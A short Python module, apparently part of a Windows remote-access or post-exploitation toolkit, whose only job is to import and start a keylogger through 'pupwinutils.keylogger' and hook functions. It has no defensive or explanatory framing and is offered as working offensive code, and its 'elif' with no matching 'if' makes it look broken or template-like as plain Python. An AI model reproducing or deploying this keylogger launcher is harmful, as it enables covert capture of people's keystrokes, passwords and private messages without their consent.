''' Start keylogger '''


__dependencies__ = {
    'windows': ['pupwinutils.keylogger', 'pupwinutils.hookfuncs'],
}

__compatibility__ = ('windows')

def main():
    pass

elif '__os:windows__':
    from pupwinutils.keylogger import keylogger_start

    def main():
        keylogger_start()
